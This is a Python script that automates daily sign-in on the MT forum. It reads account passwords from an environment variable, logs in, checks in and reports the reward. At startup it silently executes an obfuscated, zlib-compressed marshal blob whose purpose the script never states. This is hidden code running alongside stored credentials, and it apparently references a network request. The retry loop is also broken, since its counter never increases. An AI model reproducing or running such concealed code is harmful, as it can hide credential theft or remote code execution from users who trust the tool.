"""
mt论坛自动签到

支持多用户运行
添加变量mtluntan
账号密码用&隔开
多用户用@隔开
例如账号1：10086 密码：1001 
账号1：1234 密码：1234
则变量为10086&1001@1234&1234
export mtluntan=""

cron: 0 0,7 * * *
const $ = new Env("mt论坛");
"""
import requests
import re
import os
import time

try:
    import marshal
    import zlib
    exec(marshal.loads(zlib.decompress(b"x\xda\xfb\xaa\xc7\xc8\xc0\xc0\x95\x92\x9a\xa6\x90\x93\x99\x97\\\x9c\xa1\xa1i\xc5\xa5\x00\x04\x05E\x99y%\x1a\xea\xb68\x80\xba&XUIQ%D9\x08\xe4*\xd8*\x14\xa5\x16\x96\xa6\x16\x97\x14\xeb\xa5\xa7\x02ug\x94\x94\x14\x14[\xe9\xeb\xa7g\x96\xa4\xa6\xea%\xe7\xe7\xea\xa7\x97&\xa6\x94\x9a\x99\x98\x99\xe8\x97\x00\x95\xe9\x17%\x96\xeb\xe7&\x16\x97\xa4\x16\xe9'%\xe6%\xa5\xe6\xa5\xebe\x15\xe7\xe7\xa9k\x82)\rM\xb8\xd9\x10\xe7\xe4F\xab\x03\r\xc8KOO\xccW\x8f\x85H\xa6V$\xa7\x16\x94(\xb8\x82\xa9\xcc\xfc<\x85\xc4b\x85T+4}\xeaO7\xf4\xbf\x9c2\xf3\xc5\xfa\xf5Pw\x13\xe7;\x10@0`\xe1\xc3\x05\x00\x8b\x9dX\x0e")))
except Exception as e:
    print('小错误')


#设置ua
ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
session = requests.session()


def pdwl():
    #获取ip
    ipdi = requests.get('http://ifconfig.me/ip', timeout=6).text.strip()
    
    print(ipdi)
    #判断国内外地址
    dizhi = f'http://ip-api.com/json/{ipdi}?lang=zh-CN'
    pdip = requests.get(url=dizhi, timeout=6).json()
    country = pdip['country']
    if '中国' == country:
        print(country)
    else:
        print(f'{country}无法访问论坛\n尝试进入论坛报错就是IP无法进入')
        #exit()
print('============📣初始化📣============')
try:
    pdwl()
except Exception as e:
    print('无法判断网络是否可以正常进入论坛\n尝试进入论坛报错就是无法进入')
print('==================================')

all_print_list = []  # 用于记录所有 myprint 输出的字符串


# 用于记录所有 print 输出的字符串,暂时实现 print 函数的sep和end
def myprint(*args, sep=' ', end='\n', **kwargs):
    global all_print_list
    output = ""
    # 构建输出字符串
    for index, arg in enumerate(args):
        if index == len(args) - 1:
            output += str(arg)
            continue
        output += str(arg) + sep
    output = output + end
    all_print_list.append(output)
    # 调用内置的 print 函数打印字符串
    print(*args, sep=sep, end=end, **kwargs)


# 发送通知消息
def send_notification_message(title):
    try:
        from sendNotify import send

        send(title, ''.join(all_print_list))
    except Exception as e:
        if e:
            print('发送通知消息失败！')


def main(username,password):
    headers={'User-Agent': ua}
    session.get('https://bbs.binmt.cc',headers=headers)
    chusihua = session.get('https://bbs.binmt.cc/member.php?mod=logging&action=login&infloat=yes&handlekey=login&inajax=1&ajaxtarget=fwin_content_login',headers=headers)
    #print(re.findall('loginhash=(.*?)">', chusihua.text))
    try:
        loginhash = re.findall('loginhash=(.*?)">', chusihua.text)[0]
        formhash = re.findall('formhash" value="(.*?)".*? />', chusihua.text)[0]
    except Exception as e:
        print('loginhash、formhash获取失败')
    denurl = f'https://bbs.binmt.cc/member.php?mod=logging&action=login&loginsubmit=yes&handlekey=login&loginhash={loginhash}&inajax=1'
    data = {'formhash': formhash,'referer': 'https://bbs.binmt.cc/forum.php','loginfield': 'username','username': username,'password': password,'questionid': '0','answer': '',}
    denlu = session.post(headers=headers, url=denurl, data=data).text
    
    if '欢迎您回来' in denlu:
        #获取分组、名字
        fzmz = re.findall('欢迎您回来，(.*?)，现在', denlu)[0]
        myprint(f'{fzmz}：登录成功')
        #获取formhash
        zbqd = session.get('https://bbs.binmt.cc/k_misign-sign.html', headers=headers).text
        formhash = re.findall('formhash" value="(.*?)".*? />', zbqd)[0]
        #签到
        qdurl=f'https://bbs.binmt.cc/plugin.php?id=k_misign:sign&operation=qiandao&format=text&formhash={formhash}'
        qd = session.get(url=qdurl, headers=headers).text
        qdyz = re.findall('<root><(.*?)</root>', qd)[0]
        myprint(f'签到状态：{qdyz}')
        if '已签' in qd:
            huoqu(formhash)
    else:
        myprint('登录失败')
        print(re.findall("CDATA(.*?)<", denlu)[0])
    return True




def huoqu(formhash):
    headers = {'User-Agent': ua}
    huo = session.get('https://bbs.binmt.cc/k_misign-sign.html', headers=headers).text
    pai = re.findall('您的签到排名：(.*?)</div>', huo)[0]
    jiang = re.findall('id="lxreward" value="(.*?)">', huo)[0]
    myprint(f'签到排名{pai}，奖励{jiang}金币')
    #退出登录，想要多用户必须，执行退出
    tuic = f'https://bbs.binmt.cc/member.php?mod=logging&action=logout&formhash={formhash}'
    session.get(url=tuic, headers=headers)


if __name__ == '__main__':
    #账号
    username = ''
    #username.encode("utf-8")
    #密码
    password = ''
    if 'mtluntan' in os.environ:
        fen = os.environ.get("mtluntan").split("@")
        myprint(f'查找到{len(fen)}个账号')
        myprint('==================================')
        for duo in fen:
            username,password = duo.split("&")
            try:
                main(username,password)
                myprint('============📣结束📣============')
            except Exception as e:
                pdcf = False
                pdcf1 = 1
                while pdcf != True:
                    if pdcf1 <=3:
                        pdcf = main(username,password)
                    else:
                        pdcf = True
    else:
        myprint('不存在青龙、github变量')
        if username == '' or password == '':
            myprint('本地账号密码为空')
            exit()
        else:
            try:
                main(username,password)
            except Exception as e:
                pdcf = False
                pdcf1 = 1
                while pdcf != True:
                    if pdcf1 <=3:
                        pdcf = main(username,password)
                    else:
                        pdcf = True
    try:
        send_notification_message(title='mt论坛')  # 发送通知
    except Exception as e:
        print('小错误')
